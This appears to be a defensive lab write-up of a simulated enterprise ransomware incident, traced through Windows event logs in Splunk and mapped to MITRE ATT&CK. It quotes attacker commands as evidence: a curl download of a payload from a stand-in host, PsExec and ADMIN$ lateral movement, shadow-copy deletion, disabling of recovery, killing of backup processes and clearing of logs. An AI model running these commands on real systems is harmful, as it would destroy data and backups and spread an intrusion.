# 🔒 Investigation 16 – Enterprise Ransomware Outbreak, SMB Propagation & Multi-Host Encryption

## 📌 Scenario

An enterprise ransomware attack originated from the IT administrator workstation (`WIN-IT01`). The attacker performed domain reconnaissance, downloaded a ransomware payload, propagated it to multiple servers using SMB administrative shares (`ADMIN$`) and PsExec, encrypted business-critical files on Finance and HR servers, disabled recovery mechanisms, deleted backups, and cleared Windows Security logs to hinder forensic investigations.

---

# 🎯 Investigation Objectives

- Investigate ransomware deployment
- Analyze PowerShell execution
- Detect ransomware payload download
- Investigate SMB lateral movement
- Analyze PsExec execution
- Detect Windows Service installation
- Investigate Shadow Copy deletion
- Detect Recovery Environment modification
- Analyze Backup Service termination
- Investigate Enterprise File Encryption
- Detect Ransom Note creation
- Analyze Command & Control communication
- Investigate Anti-Forensics
- Map attacker behavior to MITRE ATT&CK

---

# 📊 Investigation Summary

| Category | Result |
|----------|--------|
| Total Events | **49** |
| Initial Compromised Host | **WIN-IT01** |
| Additional Compromised Hosts | **FILE-SRV01**, **HR-SRV01** |
| Primary User | **it.admin** |
| Privileged User | **administrator** |
| Attack Type | **Enterprise Ransomware Outbreak** |
| Incident Severity | 🔴 Critical |

---

# 📈 Event ID Analysis

| Event ID | Description | Count |
|----------|-------------|------:|
|1102|Audit Log Cleared|3|
|4624|Successful Logon|2|
|4625|Failed Logon|1|
|4634|Logoff|1|
|4663|Object Modified|4|
|4672|Special Privileges Assigned|1|
|4688|Process Creation|30|
|5140|Network Share Access|2|
|5156|Network Connection|3|
|7045|Service Installed|2|

---

# 📊 Severity Distribution

| Severity | Count |
|----------|------:|
|🔴 Critical|21|
|🟠 High|18|
|🟡 Medium|5|
|🟢 Low|5|

---

# 👤 Most Active Users

| User | Purpose |
|------|---------|
| **it.admin** | Initial compromised account |
| **administrator** | Used for lateral movement and ransomware deployment |

---

# 🔍 Investigation Findings

---

## Phase 1 – Initial Compromise

### Commands

```powershell
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden
```

```cmd
curl.exe http://ransom-control.example/locker.exe -o C:\Users\Public\locker.exe
```

### Findings

The attacker bypassed PowerShell execution policies and downloaded the ransomware payload (`locker.exe`) into the Public directory.

---

## Phase 2 – Ransomware Preparation

### Command

```cmd
locker.exe --prepare
```

### Findings

The ransomware initialized its execution, prepared encryption routines, and established communication with attacker infrastructure before encrypting files.

---

## Phase 3 – Enterprise Reconnaissance

### Commands

```cmd
whoami /all
hostname
ipconfig /all
net view /domain
net group "Domain Computers" /domain
nltest /dclist:corp.local
```

### Findings

The attacker enumerated:

- Logged-on user
- Network configuration
- Domain computers
- Domain Controller

This information was used to identify additional systems for ransomware propagation.

---

## Phase 4 – SMB Lateral Movement

### Commands

```cmd
net use \\FILE-SRV01\ADMIN$
```

```cmd
net use \\HR-SRV01\ADMIN$
```

### Event ID

```
5140
```

### Findings

The attacker authenticated to hidden SMB administrative shares (ADMIN$) using privileged credentials.

---

## Phase 5 – PsExec Propagation

### Command

```cmd
psexec.exe \\FILE-SRV01
```

```cmd
psexec.exe \\HR-SRV01
```

### Event ID

```
7045
```

### Findings

PsExec installed the **PSEXESVC** service on both servers and remotely executed the ransomware payload.

---

## Phase 6 – Enterprise File Encryption

### Command

```cmd
locker.exe --encrypt
```

### Findings

The ransomware encrypted files on multiple enterprise servers.

Observed encrypted files included:

- Finance_Q4.xlsx.locked
- Customer_Database.csv.locked
- Employee_Records.xlsx.locked
- Payroll_July.xlsx.locked

---

## Phase 7 – Recovery Prevention

### Commands

```cmd
vssadmin delete shadows /all /quiet
```

```cmd
bcdedit /set {default} recoveryenabled No
```

### Findings

The attacker:

- Deleted all Windows Shadow Copies
- Disabled Windows Recovery Environment

This prevented victims from restoring encrypted files.

---

## Phase 8 – Backup & Database Termination

### Command

```cmd
taskkill /F /IM sqlservr.exe /IM veeam.exe /IM backup.exe
```

### Findings

The attacker terminated:

- SQL Server
- Backup software
- Veeam Backup

This prevented database recovery and interrupted backup operations before encryption.

---

## Phase 9 – Ransom Note Creation

### Command

```cmd
cmd.exe /c echo Your files are encrypted...
```

### Files Created

- README_RESTORE.txt

### Findings

A ransom note was dropped onto compromised systems instructing victims to contact the attacker.

---

## Phase 10 – Command & Control

### Findings

The ransomware communicated with the attacker's infrastructure to report successful encryption across infected hosts.

---

## Phase 11 – Cleanup & Anti-Forensics

### Commands

```cmd
cmd.exe /c del locker.exe
```

```cmd
Security audit log cleared
```

### Event ID

```
1102
```

### Findings

The attacker deleted the ransomware payload and cleared Windows Security Event Logs from all compromised hosts.

---

# 📈 Enterprise Attack Timeline

```text
WIN-IT01 Compromised
        │
PowerShell Execution
        │
Download locker.exe
        │
Prepare Encryption
        │
Domain Enumeration
        │
SMB ADMIN$ Authentication
        │
PsExec Propagation
        │
PSEXESVC Installed
        │
FILE-SRV01 Compromised
        │
HR-SRV01 Compromised
        │
Delete Shadow Copies
        │
Disable Recovery
        │
Stop Backup Services
        │
Encrypt Enterprise Files
        │
Drop Ransom Notes
        │
Beacon to C2
        │
Delete Payload
        │
Clear Windows Event Logs
```

---

# 🎯 MITRE ATT&CK Mapping

| Technique | ID |
|------------|----|
| PowerShell | T1059.001 |
| Ingress Tool Transfer | T1105 |
| System Owner Discovery | T1033 |
| Network Configuration Discovery | T1016 |
| Remote System Discovery | T1018 |
| SMB/Windows Admin Shares | T1021.002 |
| Remote Service Session (PsExec) | T1563.002 |
| Service Execution | T1569.002 |
| Data Encrypted for Impact | T1486 |
| Inhibit System Recovery | T1490 |
| Service Stop | T1489 |
| Defacement / Ransom Note | T1491 |
| Application Layer Protocol | T1071 |
| File Deletion | T1070.004 |
| Clear Windows Event Logs | T1070.001 |

---

# 🚩 Indicators of Compromise (IOCs)

## Hosts

- WIN-IT01
- FILE-SRV01
- HR-SRV01

## Users

- it.admin
- administrator

## Suspicious Processes

- powershell.exe
- curl.exe
- locker.exe
- psexec.exe
- vssadmin.exe
- bcdedit.exe
- taskkill.exe
- cipher.exe
- wevtutil.exe

## Suspicious Files

- locker.exe
- README_RESTORE.txt
- Finance_Q4.xlsx.locked
- Customer_Database.csv.locked
- Employee_Records.xlsx.locked
- Payroll_July.xlsx.locked

## Network Indicators

### Internal

- 192.168.50.21
- 192.168.50.50
- 192.168.50.60

### External

- 198.51.100.200

---

# 🚨 Incident Conclusion

The investigation revealed a coordinated enterprise ransomware attack targeting multiple Windows systems. The attacker downloaded a ransomware payload, propagated it across the environment using SMB administrative shares and PsExec, encrypted critical Finance and HR data, disabled recovery mechanisms, terminated backup services, dropped ransom notes, communicated with attacker infrastructure, and removed forensic evidence by deleting payloads and clearing Windows Security Event Logs.

**Final Incident Severity:** 🔴 **Critical**

---

# 🛠️ Skills Demonstrated

- Splunk Enterprise Investigation
- Enterprise Ransomware Analysis
- Threat Hunting
- Windows Event Log Analysis
- SMB Investigation
- PsExec Detection
- Lateral Movement Analysis
- Ransomware Behavior Analysis
- Recovery Prevention Detection
- Backup Service Investigation
- Incident Response
- IOC Identification
- MITRE ATT&CK Mapping
- Enterprise Attack Timeline Reconstruction
- Anti-Forensics Investigation

---

# ⭐ Investigation Status

✅ Completed

**Difficulty:** ⭐⭐⭐⭐⭐⭐ (Advanced Enterprise Ransomware Investigation)
